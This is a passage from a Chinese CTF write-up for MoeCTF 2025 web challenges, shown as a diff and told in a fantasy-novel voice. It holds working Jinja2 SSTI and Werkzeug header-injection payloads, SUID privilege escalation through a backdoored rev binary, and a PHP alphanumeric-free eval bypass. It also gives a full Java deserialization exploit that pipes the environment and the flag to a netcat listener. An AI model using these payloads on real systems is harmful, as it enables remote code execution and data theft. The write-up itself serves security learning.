+            </div>
+            """
+        else:
+            login_msg = f"""
+            <div class="login-result" id="result">
+                <div class="result-title">阵法反馈</div>
+                <div id="result-content"><div class='login-success'>Welcome: {username}</div></div>
+            </div>
+            """
+            render_template_string(login_msg)
+    else:
+        login_msg = ""
+
+    return render_template("index.html", login_msg=login_msg)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=80)
+```
+
+没有 `blacklist`，不需要冗长的语法来绕过 `__`，这固然很好。但，最恐怖的是——
+
+<div align="center">
+
+**「符咒没入光幕，如石沉大海，没有任何回应。」**<!--markdownlint-disable-line MD036-->
+
+</div>
+
+![无法得到回显](./unable_to_get_return.png)
+
+我们无法拿到执行后的结果。现在，这 Jinja2 页面变成了彻底的盲盒。如何让它说话，哪怕一句——成了我们的难题。
+
+<div align="center">
+
+**「这个阵法…在主动过滤一切回响。」**<!--markdownlint-disable-line MD036-->
+
+</div>
+
+### 破阵法 I：带外攻击
+
+我们有 `dnslog` 等工具，而星澜音刚好也有一台服务器，理论上，既然盲盒从网页那狭小的阵法中吐不出答案，那我们就让它向外部服务器说出一切秘密来。只可惜——MoeCTF 2025 的目标机环境统一未向外开放网络权限。
+
+### 破阵法 II：时间盲注
+
+我们先前说过，Jinja2 支持 `{% %}` 语法来进行条件匹配——星澜音灵机一动，能不能用
+
+```python
+{% if ... %}{% for i in range(99999999) %}{% endfor %}{% endif %}
+```
+
+造出一个用于时间盲注的布尔返回器？说干就干：
+
+```python
+{% if self.__init__.__globals__.__builtins__.__import__('os').popen('ls / | grep flag').read() %}{% for i in range(99999999) %}{% endfor %}{% endif %}
+```
+
+等待……成功了！网页明显卡顿了好几秒，再试几次…仍然有明显的卡顿！找到了，`flag` 应该就在 `/` 下！经过多次反复测试，我们几乎可以断言 `flag` 就位于 `/flag`。现在我们有一个几乎疯狂的思路——用时间盲注，一个一个字符地 `dump` 出整个 `flag`！
+
+星澜音的确尝试编写了这样的脚本，让程序读取 `/flag` 的第 1 个字符，然后按照 ASCII 码停顿不同的秒数，只是……极为奇怪地，无论怎么调整，`cat` 都像被施了法术一样，始终不肯停顿哪怕一秒。星澜音顿时眉头一紧：是不是 `flag` 不是文本文件而是二进制文件？那就只好套一层 `base64` 了；结果还是没有用？星澜音的心沉了半截。
+
+星澜音只能得到一个极为大胆、暴力的推断：
+
+**我们，得不到 `/flag` 文件。**
+
+### 破阵法 III：SUID 权限
+
+我们读不了 `/flag` 文件。这几乎是诡异的梦魇——它近在眼前，又远在天边；它近在咫尺，却遥不可及。我们需要借助一些工具了，那些设置了 SUID 位的工具。
+
+系统内存在一些设置了 SUID 位的可执行文件，它们在执行时，会以文件所有者的权限运行，这是提权的常用路径。我们也许是普通等级的用户，而那 `/flag` 文件是 `root` 用户独有的盛宴，我们的目标，就是找到这些有 SUID 位的可执行文件。
+
+这些文件通常有 `tar`、`zip` 和 `cp` 等。我们可以使用 `find` 来匹配符合条件的文件，但更令人振奋的是，`find` 本身或许就符合条件！我们尝试：
+
+```python
+{% if self.__init__.__globals__.__builtins__.__import__('os').popen('find / -name tar -user root -perm -4000 -print 2>/dev/null').read() %}{% for i in range(99999999) %}{% endfor %}{% endif %}
+```
+
+嗯……`tar` 不行，但不要灰心，继续匹配剩下的文件！
+
+然后我们会发现，怎么啥都没反应😨按道理来说绝对是有的，但是……具体为什么失败了，我们仍然需要从报错信息中得到，可我们拿不到输出。阵法就此停滞……
+
+<div align="center">
+
+**「穷途末路」……？**
+
+</div>
+
+### 破阵法 IV：Python/Flask/Werkzeug 内核利用
+
+头晕目眩之时，突然有人给星澜音托梦来一段神秘密文：
+
+```python
+{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"sys_version",lipsum.__globals__.__builtins__.__import__('os').popen('whoami').read())}}
+```
+
+毕竟已经无能为力了，只好随便试试看了……输入到用户名里，密码随便输入一个，无力地点了一下按钮……啊？！
+
+![HTML 头注入攻击](./html_header_attack.png)
+
+有一瞬间星澜音突然感觉原地升天😨这种感觉太恐怖了。这托梦而来的密文为何如此卓有成效？不妨看看它做了什么。
+
+```python
+lipsum.__spec__.__init__.__globals__.sys.modules
+```
+
+首先，它从 `lipsum`，一个可以访问的全局函数对象，一步步逃逸 Jinja2 的沙箱环境，找到了 Python 解释器中一个包含了所有已加载模块的字典——`sys.modules`，这是惯用做法。
+
+```python
+.werkzeug.serving.WSGIRequestHandler
+```
+
+接下来，它从其中定位了目标类 `werkzeug.serving.WSGIRequestHandler`。`werkzeug` 是 Flask 框架底层的 WSGI 工具库，它负责处理原始的 HTTP 请求和响应；它其中的 `WSGIRequestHandler` 正是 Werkzeug 中用来处理每一个 HTTP 请求、解析请求并构建最终 HTTP 响应的那个类。
+
+在 `WSGIRequestHandler` 类中，有一个叫做 `sys_version` 的属性，它的默认值是 Python 的版本号，比如 `Python/3.8.10`。这个属性是用来构造 HTTP 响应头中的 `Server` 字段的。比如说，一个正常的 `Server` 头看起来像这样
+
+```plain
+Server: Werkzeug/2.0.1 Python/3.8.10
+```
+
+这段 Payload 使用 `popen` 执行命令并获取输出，但最后是神来一笔！它使用了一个 `setattr` 调用，将 `WSGIRequestHandler` 这个类的 `sys_version` 属性，从 `"Python/x.x.x"` 直接篡改为 `popen()` 的执行结果！在这里，我们看到它被篡改为了 `MoeCTFer`。
+
+![篡改 `sys_version` 为 `MoeCTFer`](./edit_sys_version_to_MoeCTFer.png)
+
+但是为什么网页会乱呢🤔零音推测，应该是我们的 Payload 污染了 HTTP 响应的构建过程。比如说，可能 `WSGIRequestHandler.sys_version` 被修改为 `"MoeCTFer\n"`，在结尾追加了一个 `\n` 换行符。而 Werkzeug 在处理我们的请求结束后，开始构建返回给我们的 HTTP 响应，但恰好，它在构建 `Server` 响应头的时候，将 HTTP 响应头以 `\n` 截断了，这可能造成了 HTTP 响应头注入，我们的浏览器在解析这个畸形的响应时，可能就把 HTTP Body 的源代码错误展示出来了。
+
+总之，我们现在拿到了一个最关键的漏洞——它允许我们执行任意命令了😋事不宜迟，用 `ls` 会会 `/flag` 的真面目——只需将其中一部分改为 `popen('ls -la /')`，看看响应头：
+
+```plain
+Werkzeug/3.1.3 total 80
+```
+
+嘶……看起来只能展示一行？不过也没关系😋我们用不换行的 Base64 包裹一下就好了。换成这样：
+
+```bash
+ls -la / | base64 -w 0
+```
+
+得到输出后再转回来😋终于看懂了：
+
+```plain
+-rw-------   1 root root   45 Sep  7 09:56 flag
+```
+
+6️⃣6️⃣6️⃣，还真是 `root` 只读😡看来我们必须重用带 SUID 权限的二进制文件了。不过有什么呢🤔探测一下：
+
+```bash
+find / -user root -perm -4000 -print 2>/dev/null | base64 -w 0
+```
+
+看看输出：
+
+```plain
+/usr/bin/rev
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/sudo
+```
+
+🤔怎么看起来 emmm 没啥能用的…哎别急？！
+
+```plain
+/usr/bin/rev
+```
+
+`rev`！熟悉 Linux 的朋友们应该知道它是干啥的了，它只是一个用来反转文件每一行的程序，它凭什么拿 SUID 权限啊？😡不过也好😋，`rev` 给了我们可乘之机，我们把 `/flag` 直接 `rev` 过去再 `rev` 回来，不就好了吗？事不宜迟：
+
+```bash
+/usr/bin/rev /flag | /usr/bin/rev | base64 -w 0
+```
+
+一行命令下去，怎么给我干 Connection closed 了？诡异。几经尝试还是无果，套了 N 层 Base64 还是没招——莫非这 `flag` 真有如此伟大的神力？气死零音了😡😡又一次陷入了僵局😭
+
+正当零音准备放弃时，突然，神谕在耳边响起😨
+
+<div align="center">
+
+**如果一个标准工具被赋予了不标准的权限，那么这个工具本身很可能也是不标准的。**
+
+</div>
+
+🤔沃日，怀疑了这么久 `/flag`，从来没想到过 `/usr/bin/rev` 是不是也有什么问题！Base64 后下载下来丢进 IDA Pro 里，果然没安好心啊😡
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+    int i; // [rsp+1Ch] [rbp-4h]
+
+    for ( i = 1; argc > i + 1; ++i )
+    {
+        if ( !strcmp("--HDdss", argv[i]) )
+        execvp(argv[i + 1], (char *const *)&argv[i + 1]);
+    }
+    return 0;
+}
+```
+
+`HDdss`😨？神秘参数名。这段代码遍历了调用它的全体命令行参数，寻找当前参数是否是 `"--HDdss"`，如果是，则执行它后面那个参数作为命令。当然，它用的是 `execvp` 启动新命令，但因为 `/usr/bin/rev` 本身是 SUID `root` 权限，这不爽了吗😋它所启动的一切新命令，都会直接继承 `root` 权限！这根本不是普通的 `rev`，这是一个提权工具。
+
+最终的一切也就了然了。
+
+```bash
+/usr/bin/rev --HDdss /bin/cat /flag | base64 -w 0
+```
+
+<div align="center">
+
+**三神器共鸣的嗡鸣声中，魔祖缓缓从白骨王座起身。**<br/>
+**他眼中的暗金光芒流转，仿佛蕴含着整个幽冥血海的深邃。**
+
+</div>
+
+## WebShell
+
+## WebShell_revenge
+
+> [!NOTE]
+> 本题的 `flag` 是随机的。
+
+打开网页看到一串 PHP 代码：
+
+```php
+<?php
+highlight_file(__FILE__);
+
+if (isset($_GET['shell'])) {
+    $shell = $_GET['shell'];
+    if (strlen($shell) > 30) {
+        die("error: shell length exceeded");
+    }
+    if (preg_match("/[A-Za-z0-9_$]/", $shell)) {
+        die("error: shell not allowed");
+    }
+    eval($shell);
+}
+```
+
+这真无敌了，不愧是 `revenge`，加强到哪里去了😨既不能用字母、也不能用数字、还不能用 `_` 和 `$`，甚至长度还不能大于 30，这怎么办？星澜音想了三四天也没想明白，最终还是靠神秘大神托梦了。下面给出一个 payload：
+
+```plain
+POST /?shell=?><?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?> HTTP/1.1
+Host: 127.0.0.1:13467
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Content-Type:multipart/form-data;boundary=--------123
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 114
+
+----------123
+Content-Disposition:form-data;name="file";filename="1.txt"
+
+#!/bin/sh
+cat /flag
+----------123--
+```
+
+这种攻击方式基于这样一种思想：30 个字符对于我们构造回显 `/flag` 的 `payload` 来说实在太少，因此我们可以考虑上传一个包含恶意命令的脚本文件，再构造一个无字母数字的执行代码去执行它，这样便可以绕过检测。
+
+我们在 HTTP 请求体中构造了一个 `1.txt`，它的内容很简单：
+
+```bash
+#!/bin/sh
+cat /flag
+```
+
+尽管 PHP 代码中没有处理文件的逻辑，但 PHP 引擎为了处理这个 POST 请求，依然会将这个文件内容保存在一个临时目录 `/tmp` 中，并为它生成一个随机文件名，例如 `/tmp/phpdry1ce`。事已至此，那么我们如何访问这个随机文件名的文件呢？一个合理且正确的猜测是：通配符。
+
+```plain
+. /???/????????[@-[]
+```
+
+## 23 第二十三章 幻境迷心·皇陨星沉（大结局）
+
+<div align="center">
+
+**被封印的手镯突然迸发最后的光芒！**<br/>
+**K皇 的残魂在彻底消散前，将最后的神念注入 HDdss 识海……**
+
+</div>
+
+> [!NOTE]
+>
+> 零音没学过 Java，做这道题的时候感受到了无尽的痛苦……在这里感谢所有在本题完成过程中为零音提供 Java 源代码分析和技术指导的朋友们，以及那个无时无刻都不会放弃零音的 Gemini😭
+>
+> 该题目的 `flag` 是随机的。
+
+好…好长的题目！题目给了两个容器，一个是 `dog-app`，一个是 `rev-shell`。还有一个 `demo.jar`。这坏了，零音不会 Java 啊😭看来只能硬着头皮，打开 Java Decompiler 开干了。
+
+![使用 Java Decompiler 打开 `demo.jar`](./open_demo_jar_using_java_decompiler.png)
+
+这是一个标准的 Spring Boot 可执行 JAR 包（"fat jar"），我们在左侧看到的这三个部分，恰好是 Spring Boot 独特的打包方式的核心。
+
+首先是 `BOOT-INF`，它是我们的应用程序的实际内容所在，将我们的应用和所有依赖封装在一个单一的、可部署的单元内。其中，`BOOT-INF/classes` 包含着我们编写的项目源代码编译后的 `.class` 文件，`BOOT-INF/lib` 包含我们项目所依赖的所有第三方 JAR 包。
+
+其次是 `META-INF`，它是一个符合 Java JAR 规范的标准目录，用来存放元数据（metadata）。其中，它最关键的文件是 `MANIFEST.MF`。这个文件告诉 Java 虚拟机如何运行该 JAR 包，指定 `Main-Class`，指示 Java 使用 Spring Boot 的加载器来启动应用程序。
+
+接下来是 `org.springframework.boot.loader`，它是 Spring Boot Loader 模块的完整代码，被打包进了每一个 Spring Boot fat jar 中。它是一套特殊的类加载器的实现，类似于引导程序。
+
+一般来讲，Java 程序最常出现的便是反序列化漏洞。项目中引用的第三方库，特别是处理序列化的库，通常是我们的攻击目标。我们看看 `BOOT-INF/lib` 下的内容：
+
+```plain
+jackson-annotations-2.13.4.jar
+jackson-core-2.13.4.jar
+jackson-databind-2.13.4.2.jar
+jackson-datatype-jdk8-2.13.4.jar
+jackson-datatype-jsr310-2.13.4.jar
+jackson-module-parameter-names-2.13.4.jar
+jakarta.annotation-api.1.3.5.jar
+jul-to-slf4j-1.7.36.jar
+log4j-api-2.17.2.jar
+log4j-to-slf4j-2.17.2.jar
+logback-classic-1.2.11.jar
+logback-core-1.2.11.jar
+slf4j-api-1.7.36.jar
+snakeyaml-1.29.jar
+spring-aop-5.3.23.jar
+spring-beans-5.3.23.jar
+spring-boot-2.6.13.jar
+spring-boot-autoconfigure-2.6.13.jar
+spring-boot-jarmode-layertools-2.6.13.jar
+spring-context-5.3.23.jar
+spring-core-5.3.23.jar
+spring-expression-5.3.23.jar
+spring-jcl-5.3.23.jar
+spring-web-5.3.23.jar
+spring-webmvc-5.3.23.jar
+tomcat-embed-core-9.0.68.jar
+tomcat-embed-el-9.0.68.jar
+tomcat-embed-websocket-9.0.68.jar
+```
+
+emmm 似乎没啥能用的。还是去看看代码吧，打开 `/BOOT-INF/classes/com.example.demo/controller/DogController.class`：
+
+```java
+package BOOT-INF.classes.com.example.demo.controller;
+
+import com.example.demo.Dog.Dog;
+import com.example.demo.Dog.DogService;
+import java.util.List;
+import org.springframework.web.bind.annotation.DeleteMapping;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.PathVariable;
+import org.springframework.web.bind.annotation.PostMapping;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.RestController;
+
+@RestController
+@RequestMapping({ "/dogs" })
+public class DogController {
+    private final DogService dogService;
+
+    public DogController(DogService dogService) {
+        this.dogService = dogService;
+    }
+
+    @GetMapping
+    public List<Dog> getAllDogs() {
+        return this.dogService.getAllDogs();
+    }
+
+    @PostMapping
+    public Dog addDog(@RequestParam String name, @RequestParam String breed, @RequestParam int age) {
+        return this.dogService.addDog(name, breed, age);
+    }
+
+    @PostMapping({ "/{id}/feed" })
+    public Dog feedDog(@PathVariable int id) {
+        return this.dogService.feedDog(id);
+    }
+
+    @DeleteMapping({ "/{id}" })
+    public Dog removeDog(@PathVariable int id) {
+        return this.dogService.removeDog(id);
+    }
+
+    @GetMapping({ "/export" })
+    public String exportDogs() {
+        return this.dogService.exportDogsBase64();
+    }
+
+    @PostMapping({ "/import" })
+    public String importDogs(@RequestParam("data") String base64Data) {
+        this.dogService.importDogsBase64(base64Data);
+        return "导入成功！";
+    }
+}
+```
+
+（深度思考中）我们注意到这一行代码：
+
+```java
+this.dogService.importDogsBase64(base64Data);
+```
+
+（警觉）打开那个狗狗界面看看，可以发现：由于目标机条件过于严格，我们似乎只能从「导入狗狗」那里往目标机搞点文件进去了。那么这个 `importDogsBase64` 一定是我们要利用的重中之重！这很好；我们跟踪到 `dogService` 的 `importDogsBase64` 方法（排版有修改）：
+
+```java
+public void importDogsBase64(String base64Data) {
+    try(ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(base64Data)); 
+            ObjectInputStream ois = new ObjectInputStream(bais)) {
+        Collection<Dog> imported = (Collection<Dog>)ois.readObject();
+        for (Dog dog : imported) {
+            dog.setId(this.nextId++);
+            this.dogs.put(Integer.valueOf(dog.getId()), dog);
+        } 
+    } catch (IOException|ClassNotFoundException e) {
+        e.printStackTrace();
+    }
+}
+```
+
+这段代码首先使用 `Base64.getDecoder().decode(base64Data)`，将输入的 `base64Data` 字符串解码回原始的字节数组，紧接着：
+
+```java
+ByteArrayInputStream bais = new ByteArrayInputStream(...);
+ObjectInputStream ois = new ObjectInputStream(bais);
+```
+
+程序使用解码后的字节数组创建了一个 `ByteArrayInputStream`，再将其包裹于 `ObjectInputStream` 中，这是 Java 标准库中用于反序列化（从字节流重建对象）的关键类。下面，它开始反序列化对象：
+
+```java
+Collection<Dog> imported = (Collection<Dog>) ois.readObject();
+```
+
+`ois.readObject()` 是核心方法，它从字节流中读取并重建一个 Java 对象。在这里，该方法期望读取到的是一个 `Collection`（集合，如 `ArrayList`），并且这个集合中的元素都是 `Dog` 类型的对象。代码使用强制类型转换来明确这一点。若导入成功，代码则处理导入的狗狗：
+
+```java
+for (Dog dog : imported) {
+    dog.setId(this.nextId++); // 为每只狗设置一个新的唯一 ID
+    this.dogs.put(Integer.valueOf(dog.getId()), dog); // 将狗放入 Map 中，以 ID 为键
+}
+```
+
+代码遍历反序列化得到的 `Dog` 集合，并为 `Dog` 各分配一个新的 ID，随后将这只 `Dog` 放入一个名为 `dogs` 的映射（`Map<Integer, Dog>`）中，以期通过 ID 快速查找。接下来就是异常处理和资源管理环节了，这些我们先不看。
+
+总而言之，`DogController` 中的 `/dogs/import` 接口接收 Base64 编码的数据，并最终在 `DogService` 中通过 `new ObjectInputStream(bais).readObject()` 来处理，这明确指出了一个 Java 原生的反序列化漏洞。
+
+不过就算我们能反序列化一些东西出来，这巨大的炸弹，我们该如何引爆呢？我们需要寻找一个 gadget 来完成这一点。不妨多看几行代码，我们定位到 `BOOT-INF/classes/com.example.demo/Dog/Dog.class` 里，发现了——这个！
+
+```java
+public int hashCode() {
+    wagTail(this.object, this.methodName, this.paramTypes, this.args);
+    return Objects.hash(new Object[] { Integer.valueOf(this.id) });
+}
+```
+
+问题呼之欲出啊🤔按道理，`hashCode()` 就是个用来算哈希值的函数，那第 2 行的 `return ...` 按理来说足以做到这一点，这个 `wagTail()` 放到这里，为何如此突兀🤔总而言之，即使它无害，它也不寻常；但这是 CTF，我们必须假定它是有害的。定位到 `BOOT-INF/classes/com.example.demo/Dog/DogModel.class`：
+
+```java
+default Object wagTail(Object input, String methodName, Class[] paramTypes, Object[] args) {
+    try {
+        Class<?> cls = input.getClass();
+        Method method = cls.getMethod(methodName, paramTypes);
+        return method.invoke(input, args);
+    } catch (Exception e) {
+        e.printStackTrace();
+        return null;
+    } 
+}
+```
+
+这玩意…似乎是，**「反射」**？！
+
+当然，向零音提到「反射」的话，零音大概率会想到自己 **喜欢很久的 [@干冰DryIce](https://github.com/DryIce-cc)** 在 ClassIsland 中提交的有关于「自动化」的 Pull Request [自动化初步](https://github.com/ClassIsland/ClassIsland/pull/403)。由于 ClassIsland 的架构问题，对 ClassIsland 设置的直接修改通常都需要用到反射来完成。这里的反射是 C# 中的反射，而题目的反射是 Java 的反射，不过这两者大同小异，或者说，C# 中反射的设计，比 Java 中反射的设计更统一。
+
+~~提到这一点只是为了告诉读者，零音永远喜欢干冰~~
+
+而我们事实上，可以将 C# 中的 `System.Reflection` 命名空间看作是 `java.lang.reflect` 的直接对等物。C# 和 Java 都具有反射，一个极强的原因是，它们都运行在托管环境上，其中 Java 运行在 JVM（Java Virtual Machine）上，而 C# 则运行于 CLR（Common Language Runtime）上。这些运行时环境掌握着所有加载到内存中的类型的元数据（Metadata）。反射就类似于提供给开发者一个 API，让他们在运行时也能访问和利用这些元数据。
+
+我们看到 `wagTail()` 的具体操作：它通过传入的 `input` 对象获取其 `Class` 对象，这是所有反射操作的起点。紧接着：
+
+```java
+Method method = cls.getMethod(methodName, paramTypes);
+```
+
+这是反射的核心。这行代码通过 `Class` 对象的 `getMethod` 方法，根据方法名和参数类型列表找到对应的 `Method` 对象。（这个方法必须是 `public` 的）
+
+```java
+return method.invoke(input, args);
+```
+
+紧接着，这行代码通过 `Method` 对象的 `invoke` 方法，实际执行找到的对象。后续的异常处理我们继续忽略。总而言之，`wagTail()` 可以用来进行一次反射——它可以调用 Java 程序中的任何对象，以任何参数调用任何方法。
+
+这是好的；但是就算 `wagTail()` 能引起一次反射，我们要让它在这次反射中做到什么呢🤔我们有一个这样的遥控器，但我们要遥控什么呢？我们引入一个强大的东西：`TemplatesImpl`。
+
+`TemplatesImpl` 是 Java 自带的一个正常的类（`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`），它用于处理 XML 数据，但它具有一个特性：它的 `newTransformer()` 方法被调用时，会立即执行我们预先塞在它里面的一段 Java 字节码（`_bytecodes`）！这个字段的本意是好的，它存储从 XSLT 样式表编译得到的 Java 字节码，至少从性能的角度来考虑，编译一次后存储字节码，其性能远远强于每次使用时再解析 XSLT 文件。但这恰好给我们了可乘之机：我们直接绕过 XSLT 编译过程，把自己构造的、恶意的 Java 字节码设置到这个 `_bytecodes` 字段中即可。
+
+我们最终构造这样一个命令：
+
+```java
+java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "printenv | nc 127.0.0.1 8888"});
+```
+
+现在我们需要一个代码编译器，来将这个字符串写的命令编译成 `TemplatesImpl` 能看懂的字节码。我们使用 `javassist` 即可做到这一点。构造这样的 Java 程序：
+
+```java
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Base64;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+
+public class FlagStealer {
+
+    public static void setField(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public static void main(String[] args) throws Exception {
+        String command = "cat /flag | nc 127.0.0.1 8888";
+
+        ClassPool pool = ClassPool.getDefault();
+        CtClass evilClass = pool.makeClass("Pwn");
+        String evilCode = "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", \"" + command + "\"});";
+        evilClass.addConstructor(new CtConstructor(new CtClass[0], evilClass));
+        evilClass.getConstructors()[0].setBody(evilCode);
+        evilClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
+        byte[] evilBytecode = evilClass.toBytecode();
+
+        TemplatesImpl templates = new TemplatesImpl();
+        setField(templates, "_bytecodes", new byte[][]{evilBytecode});
+        setField(templates, "_name", "Pwn");
+        setField(templates, "_tfactory", new TransformerFactoryImpl());
+
+        Class<?> dogClass = Class.forName("com.example.demo.Dog.Dog");
+        Object triggerDog = dogClass.getDeclaredConstructors()[0].newInstance(1, "TheFlag", "pwn", 777);
+        setField(triggerDog, "object", templates);
+        setField(triggerDog, "methodName", "newTransformer");
+        setField(triggerDog, "paramTypes", new Class[0]);
+        setField(triggerDog, "args", new Object[0]);
+
+        HashSet<Object> finalPayload = new HashSet<>();
+        HashMap<Object, Object> internalMap = new HashMap<>();
+        Field tableField = HashMap.class.getDeclaredField("table");
+        tableField.setAccessible(true);
+        Object[] table = (Object[]) tableField.get(internalMap);
+        Class<?> nodeClass = Class.forName("java.util.HashMap$Node");
+        Constructor<?> nodeConstructor = nodeClass.getDeclaredConstructor(int.class, Object.class, Object.class, nodeClass);
+        nodeConstructor.setAccessible(true);
+        Object node = nodeConstructor.newInstance(0, triggerDog, new Object(), null);
+        if (table == null) { table = (Object[]) java.lang.reflect.Array.newInstance(nodeClass, 1); }
+        table[0] = node;
+        tableField.set(internalMap, table);
+        Field sizeField = HashMap.class.getDeclaredField("size");
+        sizeField.setAccessible(true);
+        sizeField.set(internalMap, 1);
+        Field mapField = HashSet.class.getDeclaredField("map");
+        mapField.setAccessible(true);
+        mapField.set(finalPayload, internalMap);
+
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(finalPayload);
+        oos.close();
+        String base64Payload = Base64.getEncoder().encodeToString(baos.toByteArray());
+        System.out.println(base64Payload);
+    }
+}
+```
+
+正如之前所说的，星澜音不会写 Java，这个程序就让 Gemini 代笔了😭
+
+程序在这里使用 Javassist 动态创建一个恶意类 `Pwn`，然后在构造函数中插入执行系统命令的代码。
+
+```java
+CtClass evilClass = pool.makeClass("Pwn");
+String evilCode = "java.lang.Runtime.getRuntime().exec(...)";
+```
+
+随后利用老生常谈的 `TemplatesImpl` 类来加载恶意字节码。
+
+```java
+TemplatesImpl templates = new TemplatesImpl();
+setField(templates, "_bytecodes", new byte[][]{evilBytecode});
+```
+
+接下来程序构建触发对象：它创建一个 `Dog` 对象作为触发器，设置其反射调用 `TemplatesImpl` 的 `newTransformer` 方法：
+
+```java
+Object triggerDog = dogClass.getDeclaredConstructors()[0].newInstance(1, "TheFlag", "pwn", 777);
+setField(triggerDog, "object", templates);
+setField(triggerDog, "methodName", "newTransformer");
+```
+
+最后构造一个特殊的 `HashSet`：
+
+```java
+HashSet<Object> finalPayload = new HashSet<>();
+HashMap<Object, Object> internalMap = new HashMap<>();
+```
+
+等等🤔为什么一定要用 `HashSet`？其实这里又利用了 `HashSet` 的一个特性，它在拿到任何东西的时候都会必须先试试这东西的 `hashCode()`，这个过程是全自动的！也就是说，服务器在反序列化这个 `HashSet` 的时候，就一定会去调用这个 `hashCode()`！这是我们调用 `hashCode()` 的最好办法了😋
+
+对了，跑之前记得装一下 OpenJDK 8，因为注意到新版 JDK 对部分安全相关的功能进行了限制。总之，两个环境一个开 `nc` 监听，一个用 `nc` 发包就可以了😋至于输出，零音在这里就不放了。
+
 ## Moe 笑传之猜猜爆
 
 > [!NOTE]
-> **FLAG:** `moectf{a1ca9f03-7218-e4ca-0e31-67a065670470}`
+> 该题目的 `flag` 是随机的。
 
 在 F12 开发者工具的源代码中，于 `static` 文件夹下找到 `main.js` 文件。注意到第 1 行
 
@@ -825,8 +1964,9 @@ let randomNumber = Math.floor(Math.random()*10000) + 1; // 1-10000
 ## 摸金偶遇 FLAG，拼尽全力难战胜
 
 > [!NOTE]
-> 玩这个什么游戏导致的。<br/>
-> **FLAG:** `moectf{a521d181-6bd6-9aca-d542-8d698ea5d49c}`
+> 玩这个什么游戏导致的。
+>
+> 该题目的 `flag` 是随机的。
 
 ### 思路 1：使用 `requests` 库
 
